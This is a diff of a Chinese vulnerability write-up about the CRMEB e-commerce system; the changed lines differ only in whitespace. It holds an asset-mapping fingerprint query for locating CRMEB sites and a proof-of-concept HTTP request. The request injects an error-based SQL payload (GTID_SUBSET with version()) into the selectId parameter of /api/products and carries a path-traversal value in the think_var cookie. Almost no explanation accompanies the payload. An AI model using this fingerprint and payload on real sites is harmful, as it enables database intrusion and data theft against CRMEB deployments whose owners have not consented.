@@ -55,7 +55,7 @@ AS模式扩展能
   
 资产测绘  
 ```
-body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
+body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
 ```  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaR9q0F5MZLKbx4ibZK2nf0eus7V3JjjgibrB9APnFJiay7iaibQgDz0H1iaficA/640?wx_fmt=png&from=appmsg "")  
@@ -69,15 +69,15 @@ body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
   
 POC  
 ```
-GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,version()))),0x7e),3550) HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,version()))),0x7e),3550) HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
-Upgrade-Insecure-Requests: 1
+Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 Pragma: no-cache
 Cache-Control: no-cache
